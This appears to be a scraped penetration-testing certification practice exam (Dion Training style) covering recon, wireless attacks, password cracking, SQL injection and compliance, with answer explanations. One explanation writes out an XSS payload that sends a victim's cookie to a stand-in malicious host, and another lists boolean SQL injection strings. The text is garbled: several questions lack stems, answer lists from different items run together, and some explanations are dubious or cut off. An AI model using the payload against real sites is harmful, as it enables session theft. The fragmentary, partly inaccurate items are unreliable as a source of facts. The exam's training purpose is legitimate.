You are currently conducting passive reconnaissance in preparation for an upcoming penetration test against Dion Training. You want to identify any web pages that contain the term “password” and whose URL contains diontraining.com in the hyperlink displayed on the page. Which of the following Google hacking queries should you use?

- 

  password site:diontraining.com

- 

  password inanchor:diontraining.com

  (正確)

- 

  password link:diontraining.com

- 

  password inurl:diontraining.com

#### 解釋

OBJ-2.1: The inanchor modifier is used to search for any pages whose anchor text includes the specified term and has the search term provider somewhere on the page. For example, password inanchor:diontraining.com would return only page results that contain diontraining.com in the anchor text and have the search term “password” anywhere on the page. The link modifier is used to search for any pages that link to the website provided and have the search term anywhere on the page. For example, password link:diontraining.com would return only page results that link to Dion Training’s website and have the text “password” anywhere on the page. The inurl modifier is used to search for any pages whose URLs include the term specified and have the search term anywhere on the page. For example, password inurl:diontraining.com would return only page results whose URLs include the text “diontraining.com” and have the text “password” somewhere on the page. The site modifier is used to search only the specified website for results that contain the search term. For example, password site:diontraining.com would return only results for the word password on pages located on the Dion Training website.

You are conducting a wireless penetration test against an organization. During your attack, you created an evil twin of their wireless network. Many of the organization's laptops are now connected to your evil twin access point. Which of the following exploits should you utilize next to gather credentials from the victims browsing the internet through your access point?

- 

  Downgrade attack

  (正確)

- 

  Fragmentation attack

- 

  Karma attack

- 

  Deauthentication attack

#### 解釋

OBJ-3.1: A downgrade attack forces a client to use a weaker SSL version that the attacker can crack. Since the devices are connected through your access point, you can establish a weaker SSL-based HTTPS connection between their web browser and the actual web server they wanted. This forcing of the client to use a weaker version is known as a downgrade attack, and it allows the attacker to capture the packets and later crack them offline since SSL-based HTTPS is weak enough to crack due to vulnerabilities in its design. A fragmentation attack obtains the pseudorandom generation algorithm (PRGA) of network packets used in WEP. Deauthentication attacks are used in the service of an evil twin, replay, cracking, denial of service, and other attacks. All 802.11 Wi-Fi protocols include a management frame that a client can use to announce that it wishes to terminate a connection with an access point. The victim's device will be kicked off the access point by spoofing the victim's MAC address and sending the deauthentication frame to the access point. A karma attack is a variant of the evil twin attack. A karma attack exploits the behavior of a wireless client trying to connect to its preferred network list. This list contains the SSIDs of access points the device has connected to in the past. When a wireless device is looking to connect to the internet, it firsts beacons to determine if any of these previously connected networks are within range.

During your annual cybersecurity awareness training in your company, the instructor states that employees should be careful about what information they post on social media. According to the instructor, if you post too much personal information on social media, such as your name, birthday, hometown, and other personal details, it is much easier for an attacker to conduct which type of attack to break your passwords?

- 

  Brute force attack

- 

  Birthday attack

- 

  Rainbow table attack

- 

  Cognitive password attack

  (正確)

#### 解釋

OBJ-3.1: A cognitive password is a form of knowledge-based authentication that requires a user to answer a question, presumably something they intrinsically know, to verify their identity. If you post a lot of personal information about yourself online, this password type can easily be bypassed. For example, during the 2008 elections, Vice Presidential candidate Sarah Palin's email account was hacked because a high schooler used the "reset my password" feature on Yahoo's email service to reset her password using the information that was publically available about Sarah Palin (like her birthday, high school, and other such information).

- 

  Copies of their employee’s certifications

- 

  Statement of security clearance verification

- 

  Short list of vulnerabilities already discovered

  (正確)

- 

  Results of their completed background check

#### 解釋

OBJ-1.3: Each member of the penetration testing team should be reviewed to ensure they have the appropriate certificates and certifications that provide they have the required experience to properly conduct the engagement. The members should also have recent background checks that include their credit scores and driving records. Finally, if the team works on secure networks, they should also have valid security clearances. This is important when working for military and defense contractors. The team should not begin searching for vulnerabilities in the Fail to Pass network without prior written permission, therefore they should not have any vulnerabilities to list in their RFP response.

Which of the following tools should a penetration tester use to identify hidden directories, files, or subdomains by brute force?

- 

  Gobuster

  (正確)

- 

  Mimikatz

- 

  w3af

- 

  Hydra

#### 解釋

OBJ-5.3: Gobuster is a tool that can discover subdomains, directories, and files by brute-forcing from a list of common names. The Web Application Attack and Audit Framework (w3af) allows you to identify and exploit a large set of web-based vulnerabilities, such as SQL injection and cross-site scripting. Hydra is a password cracking tool that supports parallel testing of several network authentication types simultaneously. Mimikatz is a tool that gathers credentials by extracting key elements from memory such as cleartext passwords, hashes, and PIN codes.

A cybersecurity analyst notices that an attacker is trying to crack the WPS pin associated with a wireless printer. The device logs show that the attacker tried 00000000, 00000001, 00000002 and continued to increment by 1 number each time until they found the correct PIN of 13252342. Which of the following type of password cracking was being performed by the attacker?

- 

  Rainbow table

- 

  Brute-force

  (正確)

- 

  Hybrid

- 

  Dictionary

#### 解釋

OBJ-3.1: A brute-force attack consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing correctly. In a traditional brute-force attack, the passcode or password is incrementally increased by one letter/number each time until the right passcode/password is found. A dictionary attack is a technique for defeating a cipher or authentication mechanism by trying to determine its decryption key or passphrase by trying hundreds or sometimes millions of likely possibilities, such as words in a dictionary. A rainbow table is a precomputed list of possible hashes used when trying to speed up the process of password cracking. A hybrid password cracking attack combines the use of a brute-force attack with a dictionary attack by using words from the dictionary's list as the basis for the brute-force attack. For example, if the diction had the word Jason in it, the hybrid attack might try Jason123, Jason!@#, and J@$0n as possible combinations based on the word Jason.

You have been hired to conduct an external PCI-DSS audit of a merchant that processes over 6,000,000 credit card transactions per year. Which level would this merchant be categorized as?

- 

  Level 1

  (正確)

- 

  Level 4

- 

  Level 2

- 

  Level 3

#### 解釋

OBJ-1.1: This is a level 1 merchant. Under the PCI-DSS compliance rules, a merchant who is categorized as a level 2, level 3, or level 4 must have an external auditor conduct an annual audit or submit documentation of a self-test proving they took active steps to secure their credit card processing infrastructure. Level 1 is a large merchant with over 6,000,000 transactions per year. Level 2 is a merchant with 1,000,000 to 5,999,999 transactions per year. Level 3 is a merchant with 20,000 to 1,000,000 transactions per year. Level 4 is a small merchant with under 20,000 transactions per year.

A firewall administrator has configured a new screened subnet to allow public systems to be segmented from the organization's internal network. The firewall now has three security zones set: Untrusted (Internet) [143.27.43.0/24]; DMZ (Screened Subnet) [161.212.71.0/24]; Trusted (Intranet) [10.10.0.0/24]. The firewall administrator has been asked to enable remote desktop access from a fixed IP on the remote network to a remote desktop server in the screened subnet for the Chief Security Officer to work from his home office after hours. The CSO's home internet uses a static IP of 143.27.43.32. The remote desktop server is assigned a public-facing IP of 161.212.71.14. What rule should the administrator add to the firewall?

- 

  Permit 143.27.43.32 161.212.71.14 RDP 3389

  (正確)

- 

  Permit 143.27.43.0/24 161.212.71.14 RDP 3389

- 

  Permit 143.27.43.32 161.212.71.0/24 RDP 3389

- 

  Permit 143.27.43.0/24 161.212.71.0/24 RDP 3389

#### 解釋

OBJ-4.2: Due to the requirement to allow a single remote IP to enter the firewall, the permit statement must start with a single IP in the Untrusted (Internet) zone. Based on the options provided, only 143.27.43.32 could be correct. Next, the destination is a single server in the DMZ (screened subnet), so only 161.212.71.14 could be correct. The destination port should be 3389, which is the port for the Remote Desktop Protocol. Combining these three facts, only "permit 143.27.43.32 161.212.71.14 RDP 3389" could be correct.

An attacker recently compromised an e-commerce website for a clothing store. Which of the following methods did the attacker use to harvest an account's cached credentials when the user logged into an SSO system?

- 

  Golden ticket

- 

  Pass the hash

  (正確)

- 

  Lateral movement

- 

  Pivoting

#### 解釋

OBJ-3.7: Pass the Hash (PtH) is the process of harvesting an account's cached credentials when the user logs in to a single sign-on (SSO) system. This would then allow the attacker to use the credentials on other systems, as well. A golden ticket is a Kerberos ticket that can grant other tickets in an Active Directory environment. Attackers who can create a golden ticket can use it to grant administrative access to other domain members, even to domain controllers. Lateral movement is an umbrella term for a variety of attack types. Attackers can extend their lateral movement by a great deal if they can compromise host credentials. Pivoting is a process similar to lateral movement. When attackers pivot, they compromise one central host (the pivot) that allows them to spread out to other hosts that would otherwise be inaccessible.

Dion Training has contracted you to conduct a penetration test of its web application hosted within AWS Lamba. Part of the assessment will include stress testing the web application using a simulated DDoS attack. Which of the following entities would be the proper signing authority to approve this penetration test?

- 

  Amazon's representative since they host the servers

- 

  Neither organization's representatives since you are simulating a DDoS

- 

  Dion Training's representative since they hired you

- 

  Both organization's representatives since one is your client and the other hosts the servers

  (正確)

#### 解釋

OBJ-1.1: Written authorization documents help control the amount of liability incurred by the penetration tester. You must ensure you have the correct authorization in place before beginning your engagement. You ALWAYS need written authorization from your client. If the client uses a third-party service provider, then you may need to also get proper authorization from them in writing too. During your engagement planning, you should contact the third-party service provider to determine if written consent is required. In the case of Amazon, there are a handful of services that do not require prior authorization before conducting a penetration test on behalf of your client. DoS and DDoS attacks and simulations do require written authorization from both your client and Amazon. If you do not have this, you could be held liable for any negative consequences to Amazon and its client's servers or even be charged with criminal computer hacking.

Yoyodyne Systems has recently bought out its competitor, Whamiedyne Systems, which went out of business due to a series of data breaches. As a cybersecurity analyst for Yoyodyne, you are assessing Whamiedyne's existing applications and infrastructure. During your analysis, you discover the following URL is used to access an application:

![img](https://img-c.udemycdn.com/redactor/raw/quiz_question/2022-01-17_05-15-14-8bddb38e63595f5887bc1a7b2a68ed5f.png)

You change the URL to end with 12346 and notice that a different user's account information is displayed. Which of the following type of vulnerabilities or threats have you discovered?

- 

  XML injection

- 

  Race condition

- 

  SQL injection

- 

  Insecure direct object reference

  (正確)

#### 解釋

OBJ-3.3: This is an example of an insecure direct object reference. Direct object references are typically insecure when they do not verify whether a user is authorized to access a specific object. Therefore, it is important to implement access control techniques in applications that work with private information or other sensitive data types. Based on the URL above, you cannot determine if the application is vulnerable to an XML or SQL injection attack. An attacker can modify one or more of these four basic functions in a SQL injection attack by adding code to some input within the web app, causing it to execute the attacker’s own set of queries using SQL. An XML injection is similar but focuses on XML code instead of SQL queries. A race condition is a software vulnerability when the resulting outcome from execution processes is directly dependent on the order and timing of certain events. Those events fail to execute in the developer's order and timing, which is not the case in this scenario.

Based on this code snippet, which of the following security flaws exists in this application?

- 

  Insufficient logging and monitoring

- 

  Improper input validation

  (正確)

- 

  Improper error handling

- 

  Race condition

#### 解釋

OBJ-4.2: Based on this code snippet, the application is not utilizing input validation. This would allow a malicious user to conduct an XSS (cross-site scripting) attack. For example, an attacker could input the following for a value of “ID”: '><script>document.location= ‘http://www.malicious-website.com/cgi-bin/cookie.cgi? Foo='+document.cookie</script>'. This could cause the victim ID to be sent to “malicious-website.com” where additional code could be run, or the session can then be hijacked. Based on the code snippet provided, we have no indications of the level of logging and monitoring being performed, nor if proper error handling is being conducted. A race condition is a software vulnerability when the resulting outcome from execution processes is directly dependent on the order and timing of certain events. Those events fail to execute in the order and timing intended by the developer.

You are currently conducting passive reconnaissance in preparation for an upcoming penetration test against Dion Training. You want to identify any domain names also covered by the organization’s digital certificate to include in your assessment. Which of the following should you review to determine any other domains that can use the same digital certificate?

- 

  CRL

- 

  CSR

- 

  SAN

  (正確)

- 

  Robots.txt

#### 解釋

OBJ-2.2: Subject alternative name (SAN) is a field in a digital certificate that allows a host to be identified by multiple host names or domain names. Certificates that use a SAN are referred to as a multi-domain certificate. A certificate signing request (CSR) is a Base64 ASCII file generated on the device that needs a certificate and contains information that the certificate authority needs to create the certificate. The certificate revocation list (CRL) is a list of digital certificates that have been revoked before their expiration date and are now considered invalid. A robots.txt file tells search engine crawlers which URLs the crawler should index and access on your site.

Your company, HackMe Incorporated, is a US-based company specializing in conducting penetration tests for large corporations. Big Corp has recently asked you to perform a penetration test of its offices in Saudi Arabia and Iran. The penetration test would include both remote attacks and an on-site USB key drop attack. Which of the following MUST you investigate BEFORE you begin to negotiate the contract for this engagement?

- 

  Export restrictions that may apply to your tools

  (正確)

- 

  Type of threat actor your team will emulate

- 

  Support resources available to your team

- 

  The budget allocated for the penetration test

#### 解釋

OBJ-1.1: The United States has export restrictions that govern the shipment or transfer of software, technology, services, and other controlled items outside of the United States borders. The Export Administration Regulations (EAR) is regulated by the Bureau of Industry and Security (BIS) within the U.S. Department of Commerce. The EAR may control the export, re-export, or transfer of items such as software, hardware, algorithms, and other technical items you may require for your on-site penetration test. Exports can include the transfer of a physical product from inside the US to an external location and other actions. The simple act of releasing technology to someone other than a US citizen or lawful permanent resident within the United States is deemed an export. This includes making available software for electronic transmission that can be received by individuals outside the US. The support resources, type of threat actor, and the budget for the assessment can all be negotiated as part of the contract once you have determined which, if any, export restrictions apply to your current tools.

During a business trip, Bobby connects to the hotel's wireless network to send emails to some of his clients. The next day, Bobby notices that additional emails have been sent out from his account without consent. Which of the following protocols was MOST likely used to compromise Bobby's email password utilizing a network sniffer?

- 

  SSL

- 

  DNS

- 

  HTTP

  (正確)

- 

  TFTP

#### 解釋

OBJ-3.1: HTTP is an unsecured protocol, and information is passed without encryption. If the user signed into their webmail over HTTP instead of HTTPS, a network sniffer could compromise the username and password. Additionally, if the user was using an email client, then the SMTP connection could have been compromised, but since that wasn't an option in this question, we must assume Bobby used a webmail client over HTTP instead.

What remediation strategies are the MOST effective in reducing the risk to an embedded ICS from a network-based compromise? (Select TWO)

- 

  Patching

- 

  NIDS

- 

  Segmentation

  (正確)

- 

  Disabling unused services

  (正確)

#### 解釋

OBJ-4.2: Segmentation is the best method to reduce the risk to an embedded ICS system from a network-based compromise. Additionally, you could disable unused services to reduce the footprint of the embedded ICS. Many of these embedded ICS systems have a large number of default services running. So, by disabling the unused services, we can better secure these devices. By segmenting the devices off the main portion of the network, we can also better protect them. A NIDS might detect an attack or compromise, but it would not reduce the risk of the attack succeeding since it can only detect it. Patching is difficult for embedded ICS devices since they usually rely on customized software applications that rarely provide updates.

  Screened subnet

- 

  Internal zone

- 

  Management network

  (正確)

- 

  External zone

#### 解釋

OBJ-2.4: The management interface should only be exposed to an isolated or dedicated network used for the management and configuration of the network device and platforms only. This would also help reduce the likelihood of an attack against the virtualization platform or the hypervisor itself. The external zone (internet), internal zone (LAN), or screened subnet (formerly called a DMZ) should not have the management interface exposed to them.

A new piece of malware attempts to exfiltrate user data by hiding the traffic and sending it over a TLS-encrypted outbound traffic over random ports. What technology would be able to detect and block this type of traffic?

- 

  Stateful packet inspection

- 

  Intrusion detection system

- 

  Stateless packet inspection

- 

  Application-aware firewall

  (正確)

#### 解釋

OBJ-4.2: A web application firewall (WAF) or application-aware firewall would detect both the accessing of random ports and TLS encryption and identify it as suspicious. An application-aware firewall can make decisions about what applications are allowed or blocked by a firewall, and TLS connections are created and maintained by applications. A stateless packet inspection firewall allows or denies packets into the network based on the source and destination IP address or the traffic type (TCP, UDP, ICMP, etc.). A stateful packet inspection firewall monitors the active sessions and connections on a network. The process of stateful inspection determines which network packets should be allowed through the firewall by utilizing the information it gathered regarding active connections as well as the existing ACL rules. Neither a stateless nor stateful inspection firewall operates at layer 6 or layer 7, so they cannot inspect TLS connections. An intrusion detection system (IDS) is a device or software application that monitors a network or systems for malicious activity or policy violations. An IDS only monitors the traffic on the network, it cannot block traffic.

- 

  Base64

  (正確)

- 

  XML

- 

  Hex

#### 解釋

OBJ-5.1: The string aGVsbG8gd29ybGQNCg== is using Base64 encoding. Base64 encoding is commonly used to convert binary data, such as ASCII text characters, into an encoded string to bypass detection mechanisms in a network. While a Base64 string won't always end with an equal or double equal sign, it is common to see them used. This is because the equal signs are used to pad the string to the proper length and complement the final processing of the message's encoding.

  -T5

- 

  -T3

- 

  -T4

  (正確)

-

  CVE

  (正確)

- 

  CCE

- 

  CPE

#### 解釋

OBJ-2.1: The Common Vulnerabilities and Exposures (CVE) system provides a reference method for publicly known information-security vulnerabilities and exposures. XCCDF (extensible configuration checklist description format) is a language that is used in creating checklists for reporting results. The Common Configuration Enumeration (CCE) provides unique identifiers to system configuration issues to facilitate fast and accurate correlation of configuration data across multiple information sources and tools. Common Platform Enumeration (CPE) is a standardized method of describing and identifying classes of applications, operating systems, and hardware devices present among an enterprise's computing assets.

Your organization’s primary operating system vendor just released a critical patch for your servers. Your system administrators have recently deployed this patch and verified the installation was successful. This critical patch was designed to remediate a vulnerability that can allow a malicious actor to execute code on the server over the Internet remotely. You ran a vulnerability scan of the network and determined that all servers are still being reported as having the vulnerability. You verified all your scan configurations are correct. Which of the following might be the reason that the scan report still shows the servers as vulnerable? (SELECT ALL THAT APPLY)

- 

  The wrong IP address range was scanned during your vulnerability assessment

- 

  This critical patch did not remediate the vulnerability

  (正確)

- 

  The vulnerability assessment scan is returning a false positive

  (正確)

- 

  You conducted the vulnerability scan without waiting long enough after the patch was installed

#### 解釋

OBJ-2.4: There are two reasonable choices presented: (1) the vulnerability assessment scan is returning a false positive, or (2) this critical patch did not remediate the vulnerability. It is impossible to know which is based on the description in the question. If the patch was installed successfully, as the question states, then it is possible that the critical patch was coded incorrectly and did not remediate the vulnerability. While most operating system vendors test their patches before release to prevent this, they are sometimes rushed into production with extremely critical patches. The other possibility is that the patch does not remediate the vulnerability on all systems. When this occurs, the vendor will issue a subsequent patch to fix it and supersede the original patch. The other option is that the vulnerability assessment tool is incorrectly configured and is returning a false positive. This can occur when the signature used to detect the vulnerability is too specific or too generic to detect whether the system was patched for the vulnerability or not. The other options are incorrect, as you do not have to wait a certain period of time after installation before scanning. It is assumed that you are scanning the same IP range both times as you have verified your scan configuration.

During your previous reconnaissance that the target network uses layer 2 data to control which devices can gain access to their wireless network. Which of the following network identifiers should you use to effectively spoof your client’s address and gain access to the network?

- 

  00:1d:09:f0:92:ab

- 

  10.10.10.2

- 

  10.10.10.1

- 

  00:1a:6b:6c:0c:cc

  (正確)

#### 解釋

OBJ-2.3: Based on the scenario, you need to identify the right MAC address to use during MAC spoofing to gain access to the wireless network and bypass its MAC filtering. Since the scenario states that your team member sent the frame to an authenticated host, you need to use the target MAC address when spoofing your client onto the network.

During the reconnaissance phase of a penetration test, you have determined that your client uses several networked devices that rely on an embedded operating system. Which of the following methods would MOST likely be the best method for exploiting these?

- 

  Identify a jailbroken device for easy exploitation

- 

  Use a spearphishing campaign to trick a user into installing a RAT

- 

  Use web-based exploits against the devices web interfaces

  (正確)

- 

  Use social engineering to trick a user into opening a malicious APK

#### 解釋

OBJ-3.5: Most embedded operating systems use a web interface to access their configurations for setup and installation. Focusing on this web interface and using common web-based exploits is usually one of the best methods of exploiting a device with an embedded OS. Jailbroken devices refer to iPhones and iPads that have been configured to give the user root access to the underlying operating system. Spearphishing campaigns are not usually used against an embedded operating system since many of these devices are not used directly by an end-user. A malicious APK would be used to target an Android-based operating system and most embedded operating systems are based on Linux and not Android.

What technique is an attacker using if they review data and publicly available information to gather intelligence about the target organization without scanning or other technical information-gathering activities?

- 

  Passive reconnaissance

  (正確)

- 

  Patch management

- 

  Active scanning

- 

  Vulnerability scanning

#### 解釋

OBJ-2.1: Passive reconnaissance combines publicly available data from various sources about an organization and does not use active scanning or data gathering methods. Vulnerability scanning is an inspection of the potential points of exploitation on a computer or network to identify security holes. A vulnerability scan is usually conducted to detect and classify system weaknesses in computers, networks, and communications equipment and predict the effectiveness of countermeasures. Patch management is the process that helps acquire, test, and install multiple patches (code changes) on existing applications and software tools on a computer, enabling systems to stay updated on existing patches and determining which patches are the appropriate ones.

You have been hired to conduct an external PCI-DSS audit of a merchant that processes between 20,000 and 1,000,000 credit card transactions per year. Which level would this merchant be categorized as?

- 

  Level 1

- 

  Level 3

  (正確)

- 

  Level 2

-

OBJ-1.1: This is a level 3 merchant. Under the PCI-DSS compliance rules, a merchant who is categorized as a level 2, level 3, or level 4 must have an external auditor conduct an annual audit or submit documentation of a self-test proving they took active steps to secure their credit card processing infrastructure. Level 1 is a large merchant with over 6,000,000 transactions per year. Level 2 is a merchant with 1,000,000 to 5,999,999 transactions per year. Level 3 is a merchant with 20,000 to 1,000,000 transactions per year. Level 4 is a small merchant with under 20,000 transactions per year.

Several users have contacted the help desk to report that they received an email from a well-known bank stating that their accounts have been compromised and they need to "click here" to reset their banking password. Some of these users are not even customers of this particular bank, though. Which of the following best describes this type of attack?

- 

  Spear phishing

- 

  Phishing

  (正確)

- 

  Whaling

- 

  Brute force

#### 解釋

OBJ-3.6: Phishing is an email-based social engineering attack in which the attacker sends an email from a supposedly reputable source, such as a bank, to try to elicit private information from the victim. Phishing attacks target an indiscriminate large group of random people. The email in this scenario appears to be untargeted since it was sent to both customers and non-customers of this particular bank so it is best classified as phishing. Spear phishing is the fraudulent practice of sending emails from a seemingly known or trusted sender to induce targeted individuals to reveal confidential information. Whaling is an email-based or web-based form of phishing that targets senior executives or wealthy individuals. A brute-force attack consists of an attacker submitting many passwords or passphrases with the hope of eventually guessing correctly.

You are attempting to prioritize your vulnerability scans based on the data's criticality. This will be determined by the asset value of the data contained in each system. Which of the following would be the most appropriate metric to use in this prioritization?

- 

  The cost of acquisition of the system

- 

  The depreciated hardware cost of the system

- 

  The type of data processed by the system

  (正確)

- 

  The cost of hardware replacement of the system

#### 解釋

OBJ-4.1: The data's asset value is a metric or classification that an organization places on data stored, processed, and transmitted by an asset. Different data types, such as regulated data, intellectual property, and personally identifiable information, can determine its value. The cost of acquisition, cost of hardware replacement, and depreciated costs refer to the financial value of the hardware or system itself. This can be significantly different from the value of the information and data that the system stores and processes.

You have been hired to perform a penetration test against Dion Training's new voucher fulfillment web application. After presenting your findings to the client, they ask you to also perform a static code analysis of the application, add input sanitization to the code, and correct the web application firewall's configuration before they will accept your final report. Which of the following has occurred?

- 

  Goal reprioritization

- 

  Tolerance to impact

- 

  Scope creep

  (正確)

- 

  Post-mortem review

#### 解釋

OBJ-1.2: Scope creep is the condition that occurs when a client requests additional services after the SOW has been signed, and the project scope has been documented. This is not a condition that is limited to penetration testing, either. Practically every project manager or building contractor can provide examples of scope creep that happened with various projects. The big problem with scope creep is that it takes resources away from those documented in the SOW. It can also become a source of contention when it comes time to bill the client or complete the engagement.

You are scheduled to conduct a physical penetration test against an organization. You need to access the building when many other employees are arriving at work in the morning. Which of the following methods would be the MOST effective to utilize?

- 

  Tailgating

  (正確)

- 

  Fence jumping

- 

  Lock picking

- 

  Badge cloning

#### 解釋

OBJ-3.6: Tailgating is an attack where the attacker slips in through a secure area by following an authorized employee. The employee doesn't know that anyone is behind them. When trying to enter a building during the morning rush, it is common that other friendly employees will either hold the door open for you (piggybacking) or will open the door for themselves but not push it closed behind them as they walk through it. This would be the perfect time to use tailgating to get into the building. Lock picking is a skill using specialized tools to manipulate the components of a lock to gain access to a restricted area. Fence jumping involves climbing over a fence to breach the physical perimeter of a building. Badge cloning is the act of copying authentication data from an RFID badge’s microchip to another badge, which can be done through handheld RFID writers, which are inexpensive and easy to use.

Which of the following secure coding best practices ensures special characters like <, >, /, and ‘ are not accepted from the user via a web form?

- 

  Input validation

  (正確)

- 

  Error handling

- 

  Output encoding

- 

  Session management

#### 解釋

OBJ-4.2: Input validation is performed to ensure only properly formed data is entering the workflow in an information system, preventing malformed data from persisting in the database and triggering a malfunction of various downstream components. Input validation should happen as early as possible in the data flow, preferably as soon as the data is received from the user. Improper error handling can introduce various security problems where detailed internal error messages such as stack traces, database dumps, and error codes are displayed to an attacker. The session management implementation defines the exchange mechanism that will be used between the user and the web application to share and continuously exchange the session ID. Output encoding involves translating special characters into some different but equivalent form that is no longer dangerous in the target interpreter, for example, translating the < character into the &lt; string when writing to an HTML page.

According to the NIST SP 800-115, during which phase of an attack would a penetration tester seek to gain complete control of a system?

- 

  Planning

- 

  Reporting

- 

  Discovery

- 

  Attack

  (正確)

#### 解釋

OBJ-1.2: During the attack phase, the attacker seeks to gain access to a system, escalate that access to obtain complete control, and then conduct browsing to identify mechanisms to gain access to additional systems. The planning phase is where the assignment's scope is defined, and management approvals, documents, and agreements are signed. The discovery phase is where the actual testing starts; it can be regarded as an information-gathering phase. The attack phase is at the heart of any penetration test; it is the part of the process where a penetration test attempts to exploit a system, conduct privilege escalation, and then pivot or laterally move around the network. The reporting phase is focused on developing the final report presented to management after the penetration test.

You are working as part of a penetration testing team conducting reconnaissance. Which of the following scan options should you use in Nmap to evade an intrusion detection system?

- 

  -T2

- 

  -T4

- 

  -T5

- 

  -T0

  (正確)

#### 解釋

OBJ-2.4: -T0 and -T1 are the best options for evading an intrusion detection system, but they are extremely slow to conduct the scan. -T2 slows the scan to conserve bandwidth. -T3 is the default and most stable scanning timing option. -T4 is the recommended choice for a faster scan that is still relatively stable. -T5 is the fastest scanning option but can be unable if either your network or the target network’s speed cannot maintain the timing.

Based on this command, which of the following exploits is the penetration tester MOST likely trying to conduct?

- 

  Scheduling a task for persistence

- 

  Conduct DLL hijacking

- 

  Exploiting unquoted service paths

- 

  Download and execute a remote script

  (正確)

#### 解釋

OBJ-5.2: This command executes the PowerShell environment without loading the PowerShell profile (-nop) and in a hidden window (-w hidden). The command powershell.exe is running is shown after the -c, which stands for executing a command or script block and then exiting. This command in PowerShell to Invoke-Expression (IEX) creates a new web client object and then downloads the file located at the URL provided. This file could be malicious, and if it is another PowerShell script, it will be executed once downloaded.

  Burp Suite

  (正確)

- 

  SET

- 

  Kismet

#### 解釋

OBJ-5.3: Burp Suite is an integrated platform included for testing web applications' security by acting as a local proxy so that the attacker can capture, analyze, and manipulate HTTP traffic. SET (Social Engineering Toolkit) is an open-source penetration testing framework included with Kali Linux that supports social engineering to penetrate a network or system. Kismet is an 802.11 Layer 2 wireless network detector, sniffer, and intrusion detection system included with Kali Linux. ProxyChains is a command-line tool that enables pen testers to mask their identity and/or source IP address by sending messages through intermediary or proxy servers.

Jason is conducting a physical penetration test against a company. His objective is to enter the server room that is protected by a lock using a fingerprint reader. Jason attempts to use his finger to open the lock several times without success. He then turns his finger 45 degrees to the left, and the lock authenticates him. What is MOST likely the reason the lock opened?

  The biometric lock is set to fail open after five invalid attempts

- 

  The crossover error rate is tuned towards false positives

  (正確)

- 

  The crossover error rate is tuned towards true negatives

#### 解釋

OBJ-3.5: A biometric lock is difficult to bypass unless the installer incorrectly configures it. If the biometric lock has a high false acceptance rate, it will allow unauthorized people to open the door. The crossover error rate (CER) is the point where the false acceptance and false rejection rates are equal. When charted on a graph, this point can lean more towards accepting false positives or rejecting true positives. If it leans more towards accepting false positives, the sensitivity has decreased to allow less frustration for its users.

What should you do to prevent any other employees from accessing the link in the email above while still allowing them access to any other web pages at the domain freesmartphone.io?

- 

  Add http://www.freesmartphone.io:8080/claim.php to the load balancer

- 

  Add http://www.freesmartphone.io:8080/claim.php to the browser's group policy blocklist

  (正確)

- 

  Add DENY IP ANY ANY EQ 8080 to the IPS filter

- 

  Add DENY TCP http://www.freesmartphone.io ANY EQ 8080 to the firewall ACL

#### 解釋

OBJ-4.2: There are two ways to approach this question. First, you can consider which is the right answer (if you know it). By adding the full URL of the phishing link to the browser's group policy blocklist, the specific webpage will be blocked from being accessed by the employees while allowing the rest of the freesmartphone.io domain to be accessible. Now, why not just block the entire domain? Well, maybe the rest of the domain isn't suspect, but just this one page is. (For example, maybe someone is using a legitimate site like GitHub to host their phishing campaign. Therefore, you only want to block their portion of GitHub.) The second approach to answering this question would be to rule out the incorrect answers. If you used DENY TCP to the firewall ACL answer, you would block all access to the domain, blocking legitimate traffic as well as possible malicious activity. If you used the DENY IP ANY ANY to filter traffic at the IPS, you would block any IP traffic to ANY website over port 8080. If you added the link to the load balancer, this would not block it either. Therefore, we are only left with the correct answer of using a group policy in this case.

You have been asked to determine if Dion Training’s web server is vulnerable to a recently discovered attack on an older version of SSH. Which technique should you use to determine the current version of SSH running on their web server?

- 

  Passive scan

- 

  Vulnerability scan

- 

  Banner grabbing

  (正確)

- 

  Protocol analysis

#### 解釋

OBJ-2.2: Banner grabbing is conducted by actively connecting to the server using telnet or netcat and collecting the web server's response. This banner usually contains the server's operating system and the version number of the service (SSH) being run. This is the fastest and easiest way to determine the SSH version being run on this web server. While it is possible to use a vulnerability scanner, protocol analyzer, or to conduct a passive scan to determine the SSH version, these are more time-consuming and not fully accurate methods to determine the version being run.

Nessus is a very popular vulnerability scanner. It can be used to check how vulnerable your network is by using various plugins to test for vulnerabilities. Also, Nessus can perform compliance auditing, like internal and external PCI DSS audit scans. The nmap tool is a port scanner. Autopsy is used in digital forensic investigations.

You are conducting a penetration test against an organization. You created an evil twin of their wireless network. Many of the organization's laptops are now connected to your evil twin access point. You want to capture all of the victim's web browsing traffic in an unencrypted format during your attack. Which of the following exploits should you utilize to meet this goal?

- 

  Perform an SSL stripping attack

  (正確)

- 

  Perform an on-path attack

- 

  Perform a deauthentication attack

- 

  Perform an SSL downgrade attack

#### 解釋

OBJ-3.1: An SSL stripping attack, also known as an HTTP downgrade attack, forces the client to communicate with the web server in plain text (unencrypted) over HTTP instead of HTTPS. Both SSL downgrade and SSL stripping attacks are used to force the victim into using a weaker encryption mechanism (SSL downgrade to SSL-based HTTPS) or no encryption (SSL stripping to HTTP) for its web traffic.

If you wanted to get a complete copy of the courses table and could substitute arbitrary strings for "id" and "certification", which of the following strings would you use to successfully conduct a Boolean SQL injection?

- 

  id = "1' OR '1'=='1"

- 

  id = "1' OR '1'==1" and certification = "pentest' OR '1=='1"

- 

  certification = "cysa' OR '1'=='1"

- 

  id = "1' OR '1'=='1" and certification = "pentest’ OR '1'=='1"

  (正確)

#### 解釋

OBJ-3.3: ID and certification must be crafted so that when substituted for the “.getparameter” fields, the SQL statement formed is still complete and will return a Boolean value of true for the ENTIRE statement every time it is evaluated. The AND in the middle of the WHERE clause indicates that both the courseID and certification portion must be true in every case. When this occurs, the entire table of courses would be returned. The only string that would ensure both halves of the WHERE clause always return true would be <id = “1’ OR ‘1’ =='1”. The other statements either would only partially be true or are using the incorrect number and placement of single quotes in the SQL statement so that an error is returned.

If an administrator cannot fully remediate a vulnerability, which of the following should they implement?

- 

  A policy

- 

  A compensating control

  (正確)

- 

  Access requirements

- 

  An engineering tradeoff

#### 解釋

